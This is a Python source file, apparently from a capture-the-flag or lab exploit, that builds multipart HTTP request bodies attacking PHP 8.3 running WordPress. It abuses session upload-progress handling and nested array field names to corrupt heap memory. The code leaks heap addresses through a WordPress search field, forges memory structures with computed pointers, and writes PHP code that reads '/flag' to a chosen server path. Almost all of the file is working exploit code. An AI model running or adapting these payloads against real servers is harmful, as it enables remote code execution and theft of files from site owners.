#!/usr/bin/env python3
"""Pure payload builders for the pinned PHP 8.3.35 / WordPress 7.1.3 profile."""

from __future__ import annotations

import hashlib
import html
import struct

BOUNDARY = b"STOCK_D_LOCAL_2026"
PRESSURE_BOUNDARY = "WP_FPM_LOCAL_12694"
P_B_OFFSET = 0x8662000
Q_B_OFFSET = 0x742D9D8
SCALAR = b"upload_progress_K|b:0;"
PAIR = SCALAR + b"upload_progress_J|a:0:{}"
PHP_FILENAME = b"<?=readfile('/flag')?>"

LEAK_SHA256 = "d93793db56b5a338ed4eee8598e19eccb32d7b8cee71022ed4f8f719a3b75bac"
PRODUCER20_SHA256 = "b98fa1e49686e1d077e52c7598df08ca498c736615af7fce5790a76c2f2ffb5e"
PRODUCER22_SHA256 = "f226d06a7105b521bf1fec99f3f3ef79024c886742ab678b26703b29499b1054"
NEUTRAL_SHA256 = "7662d62f12026cdb69a93decb99db347b9010911ef53358cc61923d07d2cbc99"


def sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def make_pressure_body(
    count: int,
    depth: int,
    field_count: int,
    field_len: int,
    *,
    progress: bool = False,
    session_id: str = "",
    progress_key: str = "local_probe",
    progress_files: int = 1,
    progress_file_size: int = 1,
) -> tuple[bytes, str]:
    out = bytearray()

    def part(name: str, value: bytes, filename: bytes | None = None) -> None:
        out.extend(b"--" + PRESSURE_BOUNDARY.encode() + b"\r\n")
        out.extend(b'Content-Disposition: form-data; name="' + name.encode() + b'"')
        if filename is not None:
            out.extend(b'; filename="' + filename + b'"\r\n')
            out.extend(b"Content-Type: application/octet-stream")
        out.extend(b"\r\n\r\n" + value + b"\r\n")

    if progress:
        part("PHPSESSID", session_id.encode())
        part("PHP_SESSION_UPLOAD_PROGRESS", progress_key.encode())
        for index in range(progress_files):
            field = "f" if progress_files == 1 else f"f{index}"
            filename = b"f.bin" if progress_files == 1 else f"f{index}.bin".encode()
            part(field, b"Z" * progress_file_size, filename)

    for index in range(field_count):
        part(f"P{index:04d}", b"R" * field_len)

    for index in range(count):
        part(f"x{index}" + "[a]" * depth, b"", b"")

    out.extend(b"--" + PRESSURE_BOUNDARY.encode() + b"--\r\n")
    return bytes(out), PRESSURE_BOUNDARY


def seed_body(session_id: str) -> tuple[bytes, str]:
    body, boundary = make_pressure_body(
        901,
        60,
        0,
        4000,
        progress=True,
        session_id=session_id,
        progress_key="K",
        progress_files=1,
        progress_file_size=1,
    )
    if len(body) != 274_131:
        raise RuntimeError(f"seed geometry changed: {len(body)}")
    return body, boundary


def producer_body(field_count: int) -> tuple[bytes, str]:
    if field_count not in {20, 22}:
        raise ValueError("the PHP83 profile only has reviewed 20/22-field producers")
    body, boundary = make_pressure_body(882, 60, field_count, 256)
    expected_size = 274_602 if field_count == 20 else 275_258
    expected_sha = PRODUCER20_SHA256 if field_count == 20 else PRODUCER22_SHA256
    if len(body) != expected_size or sha256(body) != expected_sha:
        raise RuntimeError(f"producer{field_count} geometry changed")
    return body, boundary


def _consumer_body(upload_count: int, filler: int, filler_after: int) -> bytes:
    out = bytearray()

    def part(name: str, value: bytes, filename: bytes | None = None) -> None:
        out.extend(b"--" + BOUNDARY + b"\r\n")
        out.extend(b'Content-Disposition: form-data; name="' + name.encode() + b'"')
        if filename is not None:
            out.extend(b'; filename="' + filename + b'"\r\n')
            out.extend(b"Content-Type: application/octet-stream")
        out.extend(b"\r\n\r\n" + value + b"\r\n")

    for index in range(upload_count):
        if filler and index == filler_after:
            part("BIG", b"Z" * filler)
        part(f"x{index}" + "[a]" * 60, b"", b"")
    if filler and filler_after == upload_count:
        part("BIG", b"Z" * filler)
    part("PHP_SESSION_UPLOAD_PROGRESS", b"stockdwatch")
    part("f", b"z", b"f.bin")
    out.extend(b"--" + BOUNDARY + b"--\r\n")
    return bytes(out)


def _part(name: str, value: bytes) -> bytes:
    return (
        b"--"
        + BOUNDARY
        + b"\r\n"
        + b'Content-Disposition: form-data; name="'
        + name.encode()
        + b'"\r\n\r\n'
        + value
        + b"\r\n"
    )


def leak_body() -> bytes:
    payload = _consumer_body(462, 291, 462)
    old_name = b'name="x461' + b"[a]" * 60 + b'"'
    new_name = b'name="x461' + b"[a]" * 58 + b'"'
    if payload.count(old_name) != 1:
        raise RuntimeError("leak depth marker changed")
    payload = payload.replace(old_name, new_name, 1)

    if payload.count(b'name="BIG"') != 1:
        raise RuntimeError("leak filler marker changed")
    payload = payload.replace(b'name="BIG"', b'name="s"', 1)
    s_part = (
        b"--"
        + BOUNDARY
        + b"\r\n"
        + b'Content-Disposition: form-data; name="s"\r\n\r\n'
        + b"Z" * 291
        + b"\r\n"
    )
    progress_part = (
        b"--"
        + BOUNDARY
        + b"\r\n"
        + b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        + b"stockdwatch\r\n"
    )
    if payload.count(s_part + progress_part) != 1:
        raise RuntimeError("leak field order changed")
    payload = payload.replace(s_part + progress_part, progress_part + s_part, 1)

    old_final = (
        b"--"
        + BOUNDARY
        + b"\r\n"
        + b'Content-Disposition: form-data; name="f"; filename="f.bin"\r\n'
        + b"Content-Type: application/octet-stream\r\n\r\nz\r\n"
    )
    new_final = (
        b"--"
        + BOUNDARY
        + b"\r\n"
        + b"Content-Disposition: form-data; name="
        + b" " * 32
        + b'"'
        + b"N" * 291
        + b'"; filename='
        + b" " * 32
        + b'"'
        + b"F" * 291
        + b'"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n'
    )
    if payload.count(old_final) != 1:
        raise RuntimeError("leak final upload changed")
    payload = payload.replace(old_final, new_final, 1)
    if payload.count(s_part) != 1:
        raise RuntimeError("leak source field changed")
    payload = payload.replace(s_part, s_part + s_part, 1)
    if len(payload) != 141_945 or sha256(payload) != LEAK_SHA256:
        raise RuntimeError("frozen leak request changed")
    return payload


def leaked_base(response: bytes) -> int:
    prefix = b'placeholder="Type here..." value="'
    suffix = b'" type="search" name="s"'
    start = response.find(prefix)
    if start < 0:
        raise ValueError("WordPress search input absent")
    start += len(prefix)
    end = response.find(suffix, start)
    if end < 0:
        raise ValueError("WordPress search input unterminated")
    value = html.unescape(response[start:end].decode("latin1")).encode("latin1")
    if len(value) != 291 or value[:112] != b"Z" * 112 or value[224:] != b"Z" * 67:
        raise ValueError(f"search leak shape changed: len={len(value)}")
    words = struct.unpack("<14Q", value[112:224])
    bases = {word & ~0x1FFFFF for word in words}
    if len(bases) != 1 or not all(0 < word < 1 << 47 and word % 16 == 0 for word in words):
        raise ValueError("leaked words failed canonical aligned chunk gate")
    return next(iter(bases))


def _anchor_neutral(uploads: int = 687, anchor_before: int = 150, qfields: int = 142) -> bytes:
    payload = _consumer_body(uploads, 0, 0)
    token = (
        b"--"
        + BOUNDARY
        + b"\r\n"
        + f'Content-Disposition: form-data; name="x{anchor_before}'.encode()
    )
    if payload.count(token) != 1:
        raise RuntimeError("anchor upload marker changed")
    payload = payload.replace(token, _part("s", b"S" * 291) + token, 1)
    marker = _part("PHP_SESSION_UPLOAD_PROGRESS", b"stockdwatch")
    if payload.count(marker) != 1:
        raise RuntimeError("anchor progress marker changed")
    extra = b"".join(_part(f"q{index}", b"Q" * 291) for index in range(qfields))
    extra += _part("a", b"Z" * 291) * 2
    payload = payload.replace(marker, extra + marker, 1)
    return payload


_PRIMARY_PROGRESS_B_OFFSET = 0x8862000
_PRIMARY_TARGET_B_OFFSET = _PRIMARY_PROGRESS_B_OFFSET + 0x58
_PRIMARY_FAKE_F_USED = 1017
_PRIMARY_F_B_OFFSET = _PRIMARY_TARGET_B_OFFSET - 16 - 8 * _PRIMARY_FAKE_F_USED
_PRIMARY_FILE_START_B_OFFSET = _PRIMARY_PROGRESS_B_OFFSET - 0x200E
_PRIMARY_DT_B_OFFSET = _PRIMARY_FILE_START_B_OFFSET
_PRIMARY_SOURCE_B_OFFSET = _PRIMARY_DT_B_OFFSET + 16
_PRIMARY_F_FILE_OFFSET = _PRIMARY_F_B_OFFSET - _PRIMARY_FILE_START_B_OFFSET
_SENTINEL = b"BRIDGEP!" * 14
_ZERO_CONTENT = b"M" * 256


def _chosen_s_value() -> bytes:
    path = b"/tmp/local.php\0"
    value = bytearray(b"S" * 291)
    struct.pack_into("<qQ", value, 24, 9, 0)
    value[112:224] = _SENTINEL
    struct.pack_into("<qQ", value, 232, 0, 0)
    value[248:264] = b"P" * 16
    struct.pack_into("<Q", value, 264, len(path))
    value[272 : 272 + len(path)] = path
    return bytes(value)


def _primary_a_value(b: int) -> bytes:
    value = bytearray(b"Z" * 291)
    struct.pack_into(
        "<QQQQQQqQ",
        value,
        104,
        b + _PRIMARY_F_B_OFFSET,
        0,
        b + _PRIMARY_DT_B_OFFSET,
        0,
        0,
        0,
        4096,
        686,
    )
    struct.pack_into("<Q", value, 168, 0)
    return bytes(value)


def _primary_file_content() -> bytes:
    content = bytearray(b"M" * len(_ZERO_CONTENT))
    struct.pack_into("<qQ", content, 0, 0, 0)
    content[16:32] = bytes(16)
    struct.pack_into("<qQ", content, _PRIMARY_F_FILE_OFFSET, _PRIMARY_FAKE_F_USED, 0)
    return bytes(content)


def _zero_flag_carrier() -> bytes:
    body = _anchor_neutral()
    marker = _part("PHP_SESSION_UPLOAD_PROGRESS", b"stockdwatch")
    q0 = _part("q0", b"Q" * 291)
    old_final = (
        b'Content-Disposition: form-data; name="f"; filename="f.bin"\r\n'
        + b"Content-Type: application/octet-stream\r\n\r\nz\r\n--"
        + BOUNDARY
        + b"--\r\n"
    )
    new_final = (
        b'Content-Disposition: form-data; name="f"; filename="f"\r\n\r\n'
        + _ZERO_CONTENT
        + b"\r\n--"
        + BOUNDARY
        + b"--\r\n"
    )
    if body.count(marker) != 1 or body.count(q0) != 1 or not body.endswith(old_final):
        raise RuntimeError("zero-flag carrier geometry changed")
    body = body.replace(marker, _part("PHP_SESSION_UPLOAD_PROGRESS", b"K"), 1)
    body = body.replace(q0, _part("q0", b"Q" * 271), 1)
    return body[: -len(old_final)] + new_final


def _bool_candidate(b: int) -> bytes:
    if b <= 0 or b & 0x1FFFFF or b.bit_length() > 47:
        raise ValueError("invalid leaked 2 MiB chunk base")
    body = _zero_flag_carrier()
    early = b'Content-Disposition: form-data; name="s"\r\n\r\n'
    late = b'Content-Disposition: form-data; name="a"\r\n\r\n'
    old_early = early + b"S" * 291
    old_late = late + b"Z" * 291
    if body.count(old_early) != 1 or body.count(old_late) != 2 or body.count(_ZERO_CONTENT) != 1:
        raise RuntimeError("bool carrier identity changed")
    body = body.replace(old_early, early + _chosen_s_value(), 1)
    second = body.index(old_late, body.index(old_late) + len(old_late))
    body = body[:second] + late + _primary_a_value(b) + body[second + len(old_late) :]
    body = body.replace(_ZERO_CONTENT, _primary_file_content(), 1)
    if len(body) != 261_546:
        raise RuntimeError("bool carrier geometry changed")
    return body


def _bool_tail_candidate(b: int) -> bytes:
    body = _bool_candidate(b)
    closing = b"--" + BOUNDARY + b"--\r\n"
    if not body.endswith(closing):
        raise RuntimeError("bool carrier closing boundary changed")
    extra = bytearray()
    for index in range(688, 688 + 220):
        name = f"x{index}".encode() + b"[a]" * 60
        extra.extend(
            b"--"
            + BOUNDARY
            + b"\r\n"
            + b'Content-Disposition: form-data; name="'
            + name
            + b'"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n'
        )
    return body[: -len(closing)] + bytes(extra) + closing


def _carrier_file_content() -> bytes:
    content = bytearray(b"M" * 4352)
    struct.pack_into("<qQ", content, 0xFA0, 0, 0)
    content[0xFB0:0xFC0] = bytes(16)
    struct.pack_into("<qQ", content, 0x102E, _PRIMARY_FAKE_F_USED, 0)
    return bytes(content)


def _carrier_candidate(b: int) -> bytes:
    body = _bool_tail_candidate(b)
    old = _primary_file_content()
    if body.count(old) != 1:
        raise RuntimeError("tracked-file body changed")
    result = body.replace(old, _carrier_file_content(), 1)
    if len(result) != len(body) + 4352 - len(old):
        raise RuntimeError("tracked-file carrier size changed")
    return result


def _giant_primary_candidate(b: int) -> bytes:
    body = _carrier_candidate(b)
    closing = b"--" + BOUNDARY + b"--\r\n"
    first_tail = b"--" + BOUNDARY + b'\r\nContent-Disposition: form-data; name="x688'
    at = body.find(first_tail)
    if at < 0 or body.count(first_tail) != 1:
        raise RuntimeError("ordinary tail marker changed")
    body = body[:at] + closing
    extra = bytearray()
    for index in range(688, 688 + 185):
        name = f"x{index}".encode() + b"[a]" * 60
        extra.extend(
            b"--"
            + BOUNDARY
            + b"\r\n"
            + b'Content-Disposition: form-data; name="'
            + name
            + b'"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n'
        )
    extra.extend(
        b"--"
        + BOUNDARY
        + b"\r\n"
        + b'Content-Disposition: form-data; name="x873"; filename="'
        + b"G" * 700_000
        + b'"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n'
    )
    result = body[: -len(closing)] + bytes(extra) + closing
    if len(result) > 1_048_576 or result.count(b"Content-Disposition:") != 1020:
        raise RuntimeError("late parser-pressure geometry changed")
    return result


def _alt_a_value(b: int) -> bytes:
    value = bytearray(_primary_a_value(b))
    struct.pack_into("<Q", value, 104, b + _PRIMARY_F_B_OFFSET - 0x200000)
    struct.pack_into("<Q", value, 120, b + _PRIMARY_DT_B_OFFSET - 0x200000)
    return bytes(value)


def r2a_body(b: int) -> bytes:
    body = _giant_primary_candidate(b)
    previous = _primary_a_value(b)
    if body.count(previous) != 1:
        raise RuntimeError("R2a address field changed")
    result = body.replace(previous, _alt_a_value(b), 1)
    if len(result) != 1_022_006:
        raise RuntimeError("R2a geometry changed")
    return result


def _normal_second_candidate(b: int) -> bytes:
    body = r2a_body(b)
    old_s = _chosen_s_value()
    old_a = _alt_a_value(b)
    marker = b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nK\r\n'
    if body.count(old_s) != 1 or body.count(old_a) != 1 or body.count(marker) != 1:
        raise RuntimeError("neutral replacement fields changed")
    body = body.replace(old_s, b"S" * 291, 1)
    body = body.replace(old_a, b"Z" * 291, 1)
    body = body.replace(marker, marker.replace(b"K\r\n", b"J\r\n"), 1)
    return body


def neutral_body() -> bytes:
    inert_base = 0x7C7543800000
    old = _carrier_file_content()
    body = _normal_second_candidate(inert_base)
    if body.count(old) != 1:
        raise RuntimeError("neutral tracked-file carrier changed")
    body = body.replace(old, b"M" * len(old), 1)
    comparison = _normal_second_candidate(inert_base + 0x200000).replace(old, b"M" * len(old), 1)
    if body != comparison:
        raise RuntimeError("neutral request still depends on an address")
    if len(body) != 1_022_006 or sha256(body) != NEUTRAL_SHA256:
        raise RuntimeError("frozen neutral request changed")
    return body


def _r2b_file_content() -> bytes:
    content = bytearray(_carrier_file_content())
    if content[0xFA0:0xFC0] != bytes(32):
        raise RuntimeError("R2b destructor/source bytes changed")
    struct.pack_into("<QQQ", content, 0xFC0, 0, 0, 8)
    if struct.unpack_from("<qQ", content, 0x102E)[1] != 0:
        raise RuntimeError("R2b fake F next pointer changed")
    struct.pack_into("<q", content, 0x102E, 1016)
    return bytes(content)


def r2b_body(b: int) -> bytes:
    body = r2a_body(b)
    old = _carrier_file_content()
    if body.count(old) != 1:
        raise RuntimeError("R2b tracked-file carrier changed")
    body = body.replace(old, _r2b_file_content(), 1)
    marker = b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nK\r\n'
    if body.count(marker) != 1:
        raise RuntimeError("R2b progress marker changed")
    body = body.replace(marker, marker.replace(b"K\r\n", b"J\r\n"), 1)
    if len(body) != 1_022_006 or body.count(b"Content-Disposition:") != 1020:
        raise RuntimeError("R2b geometry changed")
    return body


def _writer_used_index(q_b_offset: int) -> int:
    writer_f_offset = 0x1BAB40 + 24 + 24
    delta = q_b_offset - (writer_f_offset + 16)
    if delta % 8 or not 0 <= delta // 8 < 1 << 31:
        raise ValueError("Q offset does not give a valid forward pointer index")
    return delta // 8


def _writer_s_value(path: bytes, q_b_offset: int) -> bytes:
    value = bytearray(b"S" * 291)
    struct.pack_into("<qQ", value, 24, _writer_used_index(q_b_offset), 0)
    struct.pack_into("<qQ", value, 192, 0, 0)
    value[208:224] = bytes(16)
    struct.pack_into("<Q", value, 240, len(path))
    if 248 + len(path) > len(value):
        raise ValueError("proof path exceeds the B-anchored ZendString")
    value[248 : 248 + len(path)] = path
    return bytes(value)


def _writer_a_value(b: int) -> bytes:
    s_value_offset = 0x1BAB40 + 24
    f_offset = s_value_offset + 24
    dt_offset = s_value_offset + 192
    value = bytearray(b"Z" * 291)
    struct.pack_into("<QQQQQQqQ", value, 104, b + f_offset, 0, b + dt_offset, 0, 0, 0, 4096, 686)
    struct.pack_into("<Q", value, 168, 0)
    return bytes(value)


def r3_body(b: int, proof_path: str, q_b_offset: int = Q_B_OFFSET) -> bytes:
    if b <= 0 or b & 0x1FFFFF or b.bit_length() > 47:
        raise ValueError("invalid leaked 2 MiB chunk base")
    encoded_path = proof_path.encode() + b"\0"
    body = _anchor_neutral()
    marker = b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nstockdwatch\r\n'
    if body.count(marker) != 1:
        raise RuntimeError("R3 progress marker changed")
    body = body.replace(marker, marker.replace(b"stockdwatch", b"L"), 1)
    early = b'Content-Disposition: form-data; name="s"\r\n\r\n' + b"S" * 291
    late = b'Content-Disposition: form-data; name="a"\r\n\r\n' + b"Z" * 291
    if body.count(early) != 1 or body.count(late) != 2:
        raise RuntimeError("R3 B-anchor geometry changed")
    body = body.replace(early, early[:-291] + _writer_s_value(encoded_path, q_b_offset), 1)
    second = body.index(late, body.index(late) + len(late))
    body = body[:second] + late[:-291] + _writer_a_value(b) + body[second + len(late) :]
    closing = b"--" + BOUNDARY + b"--\r\n"
    extra = bytearray()
    for index in range(688, 688 + 220):
        name = f"x{index}".encode() + b"[a]" * 60
        extra.extend(
            b"--"
            + BOUNDARY
            + b"\r\n"
            + b'Content-Disposition: form-data; name="'
            + name
            + b'"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n'
        )
    body = body[: -len(closing)] + bytes(extra) + closing
    old_filename = b'filename="f.bin"'
    if body.count(old_filename) != 1:
        raise RuntimeError("R3 tracked filename changed")
    body = body.replace(old_filename, b'filename="' + PHP_FILENAME + b'"', 1)
    if (
        len(body) > 1_048_576
        or body.count(b"Content-Disposition:") != 1054
        or body.count(PHP_FILENAME) != 1
        or body.count(encoded_path) != 1
    ):
        raise RuntimeError("R3 writer geometry changed")
    return body
